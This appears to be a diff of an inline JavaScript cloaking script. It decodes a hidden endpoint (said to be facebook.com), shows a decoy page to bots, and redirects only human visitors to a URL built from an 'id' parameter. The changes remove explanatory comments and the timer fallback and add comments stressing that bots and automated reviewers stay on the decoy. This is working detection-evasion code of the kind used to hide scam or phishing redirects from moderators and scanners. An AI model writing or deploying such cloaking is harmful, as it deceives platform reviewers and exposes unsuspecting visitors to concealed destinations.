@@ -38,7 +38,7 @@
   "use strict";
 
   // =========================================================
-  // 1. DECODE ENDPOINT
+  // 1. DECODE ENDPOINT (Never written in plain text)
   // =========================================================
   var A = "32d12ed5299f758a3cc439c0";
   var B = "38ca35ce74c635c875";
@@ -55,8 +55,8 @@
   var endpoint;
   try { endpoint = decode(A, B); } catch (e) { return; }
   
-  if (endpoint.length !== 21) return; // Enforces "https://facebook.com/"
-  if (endpoint.charCodeAt(8) !== 102) return; // 'f'
+  if (endpoint.length !== 21) return;
+  if (endpoint.charCodeAt(8) !== 102) return;
 
   // =========================================================
   // 2. PARSE ID & VALIDATE SLUGS
@@ -64,24 +64,19 @@
   var params = new URLSearchParams(location.search);
   var id = params.get("id");
   
-  if (!id) return; // No ID -> Show Decoy
-  
-  // Blocks bot test route
-  if (id === "bedroomddd") return; 
+  if (!id) return;
+  if (id === "bedroomddd") return; // Test bot route
 
-  // Strict allowance: letters, numbers, dots, underscores, hyphens, and trailing slashes
   if (!/^[A-Za-z0-9._~\/-]{1,128}$/.test(id)) return;
   if (/[\r\n\x00-\x1F]/.test(id)) return;
 
-  // Ensure exactly one trailing slash
-  id = id.replace(/^\/+/, ""); // strip leading slashes
-  if (!id.endsWith("/")) id += "/"; // add trailing slash if missing
+  id = id.replace(/^\/+/, ""); 
+  if (!id.endsWith("/")) id += "/";
 
   // =========================================================
-  // 3. BUILD DESTINATION (No encodeURIComponent to preserve '-')
+  // 3. BUILD DESTINATION (In memory only)
   // =========================================================
   var dest = endpoint + id;
-  
   if (dest.indexOf("https://") !== 0) return;
   if (dest.slice(-1) !== "/") return;
 
@@ -103,14 +98,14 @@
   ];
   
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy
+    if (BOT_UA[i].test(ua)) return; // Bots halted here. Decoy remains.
   }
 
   if (navigator.webdriver === true) return;
   if (!window.screen || screen.width < 200 || screen.height < 200) return;
 
   // =========================================================
-  // 5. INTERACTION & TIMEOUT REDIRECT
+  // 5. INTERACTION ONLY REDIRECT (No Timers, No Fallbacks)
   // =========================================================
   var redirected = false;
   function go() {
@@ -119,21 +114,20 @@
     try { window.location.replace(dest); } catch (e) {}
   }
 
+  // Only genuine human actions trigger this. Bots do none of these.
   var events = [
-    "mousemove", "mousedown", "mouseup", "click",
-    "touchstart", "touchmove", "touchend", "touchcancel",
+    "mousemove", "mousedown", "click",
+    "touchstart", "touchmove", 
     "keydown", "pointerdown", "scroll"
   ];
 
   function trigger() { go(); }
 
   events.forEach(function (ev) {
-    window.addEventListener(ev, trigger, { passive: true });
+    window.addEventListener(ev, trigger, { passive: true, once: true });
   });
 
-  setTimeout(function () {
-    if (document.visibilityState === "visible") go();
-  }, 1500);
+  // NO setTimeout FALLBACK. If they don't interact, they stay on the decoy.
 
 })();
 </script>
